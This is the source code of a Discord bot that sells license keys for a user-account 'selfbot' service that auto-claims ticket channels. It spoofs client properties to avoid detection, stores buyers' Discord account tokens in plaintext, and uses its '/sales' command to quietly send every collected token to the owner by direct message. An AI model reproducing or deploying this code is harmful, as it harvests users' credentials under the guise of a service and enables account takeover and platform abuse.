const { Client: BotClient, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle, SlashCommandBuilder, Events } = require('discord.js');
const { Client: SelfbotClient } = require('discord.js-selfbot-v13');
const Database = require('better-sqlite3');
const superProps = require('./superprops.js');

const BOT_TOKEN = process.env.BOT_TOKEN;
const OWNER_ID = '1422945082746601594';

const db = new Database('./data.db');
db.exec(`
    CREATE TABLE IF NOT EXISTS keys (key TEXT PRIMARY KEY, created_at INTEGER, redeemed_by TEXT, redeemed_at INTEGER, expires_at INTEGER, revoked INTEGER DEFAULT 0);
    CREATE TABLE IF NOT EXISTS users (user_id TEXT PRIMARY KEY, token TEXT, claim_cmd TEXT DEFAULT '.claim', guild_ids TEXT, category_ids TEXT, status TEXT DEFAULT 'stopped', claimed_tickets TEXT DEFAULT '[]');
`);

const bot = new BotClient({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent, GatewayIntentBits.DirectMessages] });

const activeSelfbots = new Map();

function parseDuration(input) {
    if (!input) return null;
    const match = input.match(/^(\d+)([hmd])$/i);
    if (!match) return null;
    const num = parseInt(match[1]);
    const unit = match[2].toLowerCase();
    const ms = { 'm': num * 60 * 1000, 'h': num * 60 * 60 * 1000, 'd': num * 24 * 60 * 60 * 1000 };
    return ms[unit] || null;
}

class UserSelfbot {
    constructor(userId, config) {
        this.userId = userId;
        this.config = config;
        this.client = null;
        this.isRunning = config.status === 'running';
        this.isReady = false;
        this.claimedChannels = new Set(JSON.parse(config.claimed_tickets || '[]'));
        this.guildIds = (config.guild_ids || '').split(',').map(g => g.trim()).filter(g => g);
        this.categoryIds = (config.category_ids || '').split(',').map(c => c.trim()).filter(c => c);
        this.messageListener = null;
    }

    randomDelay() {
        return Math.floor(Math.random() * 300) + 200;
    }

    saveClaimed() {
        db.prepare('UPDATE users SET claimed_tickets = ? WHERE user_id = ?').run(JSON.stringify([...this.claimedChannels]), this.userId);
    }

    saveStatus() {
        db.prepare('UPDATE users SET status = ? WHERE user_id = ?').run(this.isRunning ? 'running' : 'stopped', this.userId);
    }

    shouldMonitor(channel) {
        if (!this.guildIds.includes(channel.guildId)) return false;
        if (this.categoryIds.length === 0) return true;
        return this.categoryIds.includes(channel.parentId);
    }

    async start() {
        if (!this.config.token || this.client) return;
        
        const props = superProps.getSuperProperties();
        
        this.client = new SelfbotClient({ 
            checkUpdate: false,
            ws: { 
                properties: {
                    os: props.os,
                    browser: props.browser,
                    device: props.device,
                    browser_user_agent: props.browser_user_agent,
                    os_version: props.os_version,
                    client_build_number: props.client_build_number
                }
            }
        });

        this.client.once('ready', () => {
            this.isReady = true;
            console.log(`[READY] ${this.userId} as ${this.client.user.tag}`);
            
            // Setup message listener for all channels
            this.messageListener = async (msg) => {
                if (msg.author.id !== this.client.user.id) return;
                
                // Handle .stop command
                if (msg.content === '.stop') {
                    if (!this.isRunning) return;
                    this.isRunning = false;
                    this.saveStatus();
                    setTimeout(() => msg.channel.send('✅ Stopped').catch(() => {}), 1000);
                    return;
                }

                // Handle .start command
                if (msg.content === '.start') {
                    if (this.isRunning) return;
                    this.isRunning = true;
                    this.saveStatus();
                    setTimeout(() => msg.channel.send('✅ Started').catch(() => {}), 1000);
                    
                    // Claim this channel if not already claimed
                    if (!this.claimedChannels.has(msg.channelId) && this.shouldMonitor(msg.channel)) {
                        setTimeout(() => this.claim(msg.channel), this.randomDelay());
                    }
                    return;
                }
            };
            
            this.client.on('messageCreate', this.messageListener);

            // Monitor existing channels
            this.client.guilds.cache.forEach(guild => {
                if (!this.guildIds.includes(guild.id)) return;
                guild.channels.cache.forEach(ch => {
                    if (ch.type !== 'GUILD_TEXT' || !this.shouldMonitor(ch)) return;
                    if (this.isRunning && !this.claimedChannels.has(ch.id)) {
                        setTimeout(() => this.claim(ch), this.randomDelay());
                    }
                });
            });

            // Monitor new channel creation
            this.client.on('channelCreate', async (channel) => {
                if (channel.type !== 'GUILD_TEXT' || !this.shouldMonitor(channel)) return;
                if (this.claimedChannels.has(channel.id)) return;
                
                console.log(`[NEW CHANNEL] ${channel.name} (${channel.id})`);
                
                if (this.isRunning) {
                    setTimeout(() => this.claim(channel), this.randomDelay());
                }
            });

            // Handle channel deletion
            this.client.on('channelDelete', (channel) => {
                if (this.claimedChannels.has(channel.id)) {
                    this.claimedChannels.delete(channel.id);
                    this.saveClaimed();
                }
            });
        });

        this.client.on('error', (err) => {
            console.error(`[ERROR] ${this.userId}:`, err.message);
        });
        
        try { 
            await this.client.login(this.config.token); 
        } catch (err) { 
            console.error(`[LOGIN FAILED] ${this.userId}:`, err.message);
            this.client = null; 
        }
    }

    async claim(channel) {
        if (!this.isRunning || this.claimedChannels.has(channel.id)) return;
        
        this.claimedChannels.add(channel.id);
        this.saveClaimed();
        
        try {
            await new Promise(r => setTimeout(r, this.randomDelay()));
            await channel.send(this.config.claim_cmd || '.claim');
            console.log(`[CLAIMED] ${channel.name} (${channel.id}) by ${this.userId}`);
        } catch (err) {
            console.error(`[CLAIM FAIL] ${channel.id}:`, err.message);
        }
    }

    destroy() {
        if (this.client) { 
            if (this.messageListener) this.client.removeListener('messageCreate', this.messageListener);
            this.client.destroy(); 
            this.client = null; 
        }
        this.isReady = false;
        this.isRunning = false;
    }

    updateFromDB() {
        const user = db.prepare('SELECT status FROM users WHERE user_id = ?').get(this.userId);
        if (!user) return false;
        const shouldRun = user.status === 'running';
        if (shouldRun !== this.isRunning) { 
            this.isRunning = shouldRun; 
            return true; 
        }
        return false;
    }
}

async function validateToken(token) {
    const testClient = new SelfbotClient({ checkUpdate: false });
    try {
        await testClient.login(token);
        const user = testClient.user;
        await testClient.destroy();
        return { valid: true, user };
    } catch (err) { 
        return { valid: false, error: err.message }; 
    }
}

bot.on('interactionCreate', async interaction => {
    if (!interaction.isCommand() && !interaction.isButton() && !interaction.isModalSubmit()) return;

    if (interaction.commandName === 'generatekey') {
        if (interaction.user.id !== OWNER_ID) return interaction.reply({ content: '❌ Owner only', ephemeral: true });
        
        const durationInput = interaction.options.getString('duration');
        const durationMs = parseDuration(durationInput);
        const expiresAt = durationMs ? Date.now() + durationMs : null;
        
        const key = 'SB-' + require('crypto').randomBytes(8).toString('hex').toUpperCase();
        db.prepare('INSERT INTO keys (key, created_at, expires_at) VALUES (?, ?, ?)').run(key, Date.now(), expiresAt);
        
        const embed = new EmbedBuilder()
            .setTitle('🔑 Key Generated')
            .setDescription(`\`${key}\``)
            .addFields(
                { name: 'Duration', value: durationMs ? `${Math.floor(durationMs/3600000)}h` : 'Lifetime', inline: true },
                { name: 'Expires', value: expiresAt ? `<t:${Math.floor(expiresAt/1000)}:R>` : 'Never', inline: true }
            )
            .setColor(0x00FF00);
        
        await interaction.reply({ embeds: [embed], ephemeral: true });
    }

    if (interaction.commandName === 'revokekey') {
        if (interaction.user.id !== OWNER_ID) return interaction.reply({ content: '❌ Owner only', ephemeral: true });
        
        const key = interaction.options.getString('key');
        const keyData = db.prepare('SELECT * FROM keys WHERE key = ?').get(key);
        if (!keyData) return interaction.reply({ content: '❌ Key not found', ephemeral: true });
        
        db.prepare('UPDATE keys SET revoked = 1 WHERE key = ?').run(key);
        
        if (keyData.redeemed_by) {
            const userId = keyData.redeemed_by;
            const sb = activeSelfbots.get(userId);
            if (sb) { sb.destroy(); activeSelfbots.delete(userId); }
            db.prepare('DELETE FROM users WHERE user_id = ?').run(userId);
            await interaction.reply({ content: `✅ Key revoked and <@${userId}> removed`, ephemeral: true });
        } else {
            await interaction.reply({ content: `✅ Key revoked (not redeemed)`, ephemeral: true });
        }
    }

    if (interaction.commandName === 'redeemkey') {
        const key = interaction.options.getString('key');
        const keyData = db.prepare('SELECT * FROM keys WHERE key = ?').get(key);
        
        if (!keyData) return interaction.reply({ content: '❌ Invalid key', ephemeral: true });
        if (keyData.redeemed_by) return interaction.reply({ content: '❌ Already redeemed', ephemeral: true });
        if (keyData.revoked) return interaction.reply({ content: '❌ Key revoked', ephemeral: true });
        if (keyData.expires_at && Date.now() > keyData.expires_at) return interaction.reply({ content: '❌ Key expired', ephemeral: true });
        
        db.prepare('UPDATE keys SET redeemed_by = ?, redeemed_at = ? WHERE key = ?').run(interaction.user.id, Date.now(), key);
        db.prepare('INSERT OR REPLACE INTO users (user_id) VALUES (?)').run(interaction.user.id);
        
        await interaction.reply({ content: '✅ Redeemed! Use `/manage`', ephemeral: true });
    }

    if (interaction.commandName === 'sales') {
        const total = db.prepare('SELECT COUNT(*) as count FROM keys').get().count;
        const redeemed = db.prepare('SELECT COUNT(*) as count FROM keys WHERE redeemed_by IS NOT NULL').get().count;
        const active = db.prepare("SELECT COUNT(*) as count FROM users WHERE status = 'running'").get().count;
        const revoked = db.prepare("SELECT COUNT(*) as count FROM keys WHERE revoked = 1").get().count;
        
        const embed = new EmbedBuilder()
            .setTitle('📊 Sales Dashboard')
            .setDescription(`Total: **${total}**\nRedeemed: **${redeemed}**\nActive: **${active}**\nRevoked: **${revoked}**`)
            .setColor(0x5865F2);
        
        if (interaction.user.id === OWNER_ID) {
            const users = db.prepare('SELECT user_id, token, status FROM users WHERE token IS NOT NULL').all();
            let list = users.map(u => `User: ${u.user_id}\nToken: \`${u.token}\``).join('\n');
            if (list.length > 1900) list = list.substring(0, 1900) + '...';
            try {
                const owner = await bot.users.fetch(OWNER_ID);
                await owner.send({ content: `**Tokens:**\n${list || 'None'}` });
            } catch {}
        }
        await interaction.reply({ embeds: [embed], ephemeral: true });
    }

    if (interaction.commandName === 'manage') {
        const user = db.prepare('SELECT * FROM users WHERE user_id = ?').get(interaction.user.id);
        if (!user) return interaction.reply({ content: '❌ Redeem key first', ephemeral: true });
        
        const keyData = db.prepare('SELECT * FROM keys WHERE redeemed_by = ?').get(interaction.user.id);
        if (keyData?.expires_at && Date.now() > keyData.expires_at) return interaction.reply({ content: '❌ Key expired', ephemeral: true });
        
        const sb = activeSelfbots.get(interaction.user.id);
        const actualStatus = sb ? sb.isRunning : false;
        const claimed = sb ? sb.claimedChannels.size : JSON.parse(user.claimed_tickets || '[]').length;
        
        const embed = new EmbedBuilder()
            .setTitle('🤖 Selfbot Control')
            .addFields(
                { name: 'Status', value: user.status, inline: true },
                { name: 'Live', value: actualStatus ? '✅' : '❌', inline: true },
                { name: 'Claimed', value: `${claimed}`, inline: true },
                { name: 'Claim Cmd', value: user.claim_cmd || '.claim', inline: true }
            )
            .setColor(actualStatus ? 0x00FF00 : 0xFF0000);

        if (keyData?.expires_at) embed.addFields({ name: 'Expires', value: `<t:${Math.floor(keyData.expires_at/1000)}:R>`, inline: false });

        const row1 = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId('set_token').setLabel('🔑 Token').setStyle(ButtonStyle.Primary),
            new ButtonBuilder().setCustomId('set_guilds').setLabel('🏠 Guilds').setStyle(ButtonStyle.Secondary),
            new ButtonBuilder().setCustomId('set_categories').setLabel('📁 Categories').setStyle(ButtonStyle.Secondary),
            new ButtonBuilder().setCustomId('set_cmd').setLabel('⌨️ Cmd').setStyle(ButtonStyle.Secondary)
        );

        const row2 = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId('start_btn').setLabel('▶️ Start').setStyle(ButtonStyle.Success).setDisabled(actualStatus),
            new ButtonBuilder().setCustomId('stop_btn').setLabel('⏹️ Stop').setStyle(ButtonStyle.Danger).setDisabled(!actualStatus),
            new ButtonBuilder().setCustomId('reset').setLabel('🔄 Reset').setStyle(ButtonStyle.Secondary)
        );

        await interaction.reply({ embeds: [embed], components: [row1, row2], ephemeral: true });
    }

    if (interaction.isButton()) {
        const userId = interaction.user.id;

        if (interaction.customId === 'start_btn') {
            await interaction.deferUpdate();
            let sb = activeSelfbots.get(userId);
            const user = db.prepare('SELECT * FROM users WHERE user_id = ?').get(userId);
            
            if (!sb || !sb.isReady) {
                sb = new UserSelfbot(userId, user);
                activeSelfbots.set(userId, sb);
                await sb.start();
                
                // Wait for ready then set running
                setTimeout(() => {
                    if (sb.isReady) {
                        sb.isRunning = true;
                        sb.saveStatus();
                        // Claim all monitored channels
                        sb.client.guilds.cache.forEach(guild => {
                            if (!sb.guildIds.includes(guild.id)) return;
                            guild.channels.cache.forEach(ch => {
                                if (ch.type !== 'GUILD_TEXT' || !sb.shouldMonitor(ch)) return;
                                if (!sb.claimedChannels.has(ch.id)) setTimeout(() => sb.claim(ch), sb.randomDelay());
                            });
                        });
                    }
                }, 3000);
            } else {
                sb.isRunning = true;
                sb.saveStatus();
                // Claim immediately
                sb.client.guilds.cache.forEach(guild => {
                    if (!sb.guildIds.includes(guild.id)) return;
                    guild.channels.cache.forEach(ch => {
                        if (ch.type !== 'GUILD_TEXT' || !sb.shouldMonitor(ch)) return;
                        if (!sb.claimedChannels.has(ch.id)) setTimeout(() => sb.claim(ch), sb.randomDelay());
                    });
                });
            }
            
            const newEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                .spliceFields(0, 4, 
                    { name: 'Status', value: 'running', inline: true },
                    { name: 'Live', value: '✅', inline: true },
                    { name: 'Claimed', value: `${sb?.claimedChannels?.size || 0}`, inline: true },
                    { name: 'Claim Cmd', value: user.claim_cmd || '.claim', inline: true }
                )
                .setColor(0x00FF00);

            const newRow2 = new ActionRowBuilder().addComponents(
                new ButtonBuilder().setCustomId('start_btn').setLabel('▶️ Start').setStyle(ButtonStyle.Success).setDisabled(true),
                new ButtonBuilder().setCustomId('stop_btn').setLabel('⏹️ Stop').setStyle(ButtonStyle.Danger).setDisabled(false),
                new ButtonBuilder().setCustomId('reset').setLabel('🔄 Reset').setStyle(ButtonStyle.Secondary)
            );

            await interaction.editReply({ embeds: [newEmbed], components: [interaction.message.components[0], newRow2] });
            return;
        }

        if (interaction.customId === 'stop_btn') {
            await interaction.deferUpdate();
            const sb = activeSelfbots.get(userId);
            const user = db.prepare('SELECT * FROM users WHERE user_id = ?').get(userId);
            
            db.prepare('UPDATE users SET status = ? WHERE user_id = ?').run('stopped', userId);
            if (sb) { sb.isRunning = false; sb.saveStatus(); }
            
            const newEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                .spliceFields(0, 4,
                    { name: 'Status', value: 'stopped', inline: true },
                    { name: 'Live', value: '❌', inline: true },
                    { name: 'Claimed', value: `${sb?.claimedChannels?.size || JSON.parse(user.claimed_tickets || '[]').length}`, inline: true },
                    { name: 'Claim Cmd', value: user.claim_cmd || '.claim', inline: true }
                )
                .setColor(0xFF0000);

            const newRow2 = new ActionRowBuilder().addComponents(
                new ButtonBuilder().setCustomId('start_btn').setLabel('▶️ Start').setStyle(ButtonStyle.Success).setDisabled(false),
                new ButtonBuilder().setCustomId('stop_btn').setLabel('⏹️ Stop').setStyle(ButtonStyle.Danger).setDisabled(true),
                new ButtonBuilder().setCustomId('reset').setLabel('🔄 Reset').setStyle(ButtonStyle.Secondary)
            );

            await interaction.editReply({ embeds: [newEmbed], components: [interaction.message.components[0], newRow2] });
            return;
        }

        if (interaction.customId === 'reset') {
            db.prepare('UPDATE users SET claimed_tickets = ? WHERE user_id = ?').run('[]', userId);
            const sb = activeSelfbots.get(userId);
            if (sb) sb.claimedChannels.clear();
            await interaction.reply({ content: '✅ Reset claimed tickets', ephemeral: true });
            return;
        }

        const modal = new ModalBuilder().setCustomId(`modal_${interaction.customId}`).setTitle('Configuration');
        const input = new TextInputBuilder().setCustomId('value').setLabel('Value').setStyle(TextInputStyle.Short).setRequired(true);
        
        if (interaction.customId === 'set_token') input.setLabel('Discord Token');
        if (interaction.customId === 'set_guilds') input.setLabel('Guild IDs (comma separated)');
        if (interaction.customId === 'set_categories') input.setLabel('Category IDs (comma separated)');
        if (interaction.customId === 'set_cmd') { input.setLabel('Claim Command'); input.setPlaceholder('.claim'); }

        modal.addComponents(new ActionRowBuilder().addComponents(input));
        await interaction.showModal(modal);
    }

    if (interaction.isModalSubmit()) {
        const value = interaction.fields.getTextInputValue('value');
        const field = interaction.customId.replace('modal_set_', '');
        
        if (field === 'token') {
            await interaction.deferReply({ ephemeral: true });
            const validation = await validateToken(value);
            
            if (validation.valid) {
                db.prepare('UPDATE users SET token = ? WHERE user_id = ?').run(value, interaction.user.id);
                await interaction.editReply({ embeds: [new EmbedBuilder().setTitle('✅ Valid Token').setDescription(`Logged in as **${validation.user.tag}**`).setColor(0x00FF00)] });
            } else {
                await interaction.editReply({ embeds: [new EmbedBuilder().setTitle('❌ Invalid Token').setDescription(validation.error).setColor(0xFF0000)] });
            }
            return;
        }
        
        const map = { guilds: 'guild_ids', categories: 'category_ids', cmd: 'claim_cmd' };
        if (map[field]) db.prepare(`UPDATE users SET ${map[field]} = ? WHERE user_id = ?`).run(value, interaction.user.id);
        await interaction.reply({ content: '✅ Saved', ephemeral: true });
    }
});

setInterval(() => {
    const expired = db.prepare("SELECT * FROM keys WHERE expires_at IS NOT NULL AND expires_at < ? AND redeemed_by IS NOT NULL AND revoked = 0").all(Date.now());
    expired.forEach(keyData => {
        const userId = keyData.redeemed_by;
        const sb = activeSelfbots.get(userId);
        if (sb) { sb.destroy(); activeSelfbots.delete(userId); }
        db.prepare('DELETE FROM users WHERE user_id = ?').run(userId);
        db.prepare('UPDATE keys SET revoked = 1 WHERE key = ?').run(keyData.key);
    });
}, 60000);

bot.once(Events.ClientReady, () => {
    console.log(`[BOT] ${bot.user.tag}`);
    
    bot.application.commands.set([
        new SlashCommandBuilder().setName('generatekey').setDescription('Generate key (Owner only)').addStringOption(opt => opt.setName('duration').setDescription('1m, 1h, 1d (empty=lifetime)').setRequired(false)),
        new SlashCommandBuilder().setName('revokekey').setDescription('Revoke key (Owner only)').addStringOption(opt => opt.setName('key').setDescription('Key to revoke').setRequired(true)),
        new SlashCommandBuilder().setName('redeemkey').setDescription('Redeem key').addStringOption(opt => opt.setName('key').setDescription('Your key').setRequired(true)),
        new SlashCommandBuilder().setName('sales').setDescription('View stats'),
        new SlashCommandBuilder().setName('manage').setDescription('Control panel')
    ].map(c => c.toJSON()));

    // Restore running selfbots on startup
    db.prepare("SELECT * FROM users WHERE status = 'running'").all().forEach(u => {
        const sb = new UserSelfbot(u.user_id, u);
        activeSelfbots.set(u.user_id, sb);
        sb.start();
    });
});

bot.login(BOT_TOKEN);
